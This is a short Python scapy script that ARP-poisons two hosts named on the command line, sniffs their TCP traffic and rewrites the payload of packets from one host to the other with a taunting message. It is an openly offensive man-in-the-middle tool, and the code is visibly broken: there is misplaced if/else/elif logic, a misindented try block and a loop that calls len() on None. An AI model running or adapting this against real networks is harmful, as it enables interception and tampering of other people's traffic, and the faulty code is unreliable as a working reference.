#!/usr/bin/python3
from sys import argv, stderr
import uuid
from scapy.all import *
import socket
import time
from datetime import datetime

def logError(*args, **kwargs) -> None:
    return print(datetime.now(), *args, file=stderr, **kwargs)

def get_ip_address():
    try:
        # Create a socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Connect to a remote server (doesn't matter which one)
        s.connect(("8.8.8.8", 80))
        # Get the local IP address from socket
        ip_address = s.getsockname()[0]
        return ip_address
    except Exception as e:
        logError("Error occurred while retrieving IP address:", e)
        return None

def get_mac_address() -> str:
    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
    mac_address = ':'.join([mac[i:i+2] for i in range(0, 12, 2)])
    return mac_address

def arp_poisoning(a_ip, b_ip):
    # Poison target A
    arp_a = ARP(op=1, pdst=a_ip, psrc=b_ip, hwdst=spoof_mac)
    send(arp_a, verbose=False)
    print(f"Poisoning target A: {a_ip}")
    # Poison target B
    arp_b = ARP(op=1, pdst=b_ip, psrc=a_ip, hwdst=spoof_mac)
    send(arp_b, verbose=False)
    print(f"Poisoning target B: {b_ip}")

def spoof_pkt(pkt):
    if pkt[IP].src == a_ip and pkt[IP].dst == b_ip:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
    # Construct the new payload based on the old payload.
    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        newdata = "HA, I have spoofed this packet" 
        send(newpkt/newdata)
    else: send(newpkt)

    elif pkt[IP].src == b_ip and pkt[IP].dst == a_ip:
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)


if __name__ == "__main__":
    spoof_mac = get_mac_address()
    ARP_EXPIRATION_DURATION = 60 # Linux ARP cache timeout duration (its 120 for NT windows)
    pkt = None  
  try:
        # SYNTAX python3 arp-poisoning.py <A ip address> <B ip address>
        a_ip = argv[1]
        b_ip = argv[2]
    except IndexError:
        logError("SYNTAX ERROR:", "invalid parameters\n", "python3 arp-poisoning.py <ip address> <ip address>")
        exit(1)
    
    while (len(pkt) > 0 or pkt != None):
        arp_poisoning(a_ip, b_ip)
        pkt = sniff(iface='eth0', 
                    filter = f'(dst net {a_ip} or dst net {b_ip}) and tcp', 
                    prn = spoof_pkt, 
                    timeout = ARP_EXPIRATION_DURATION
                   )
    exit(0)
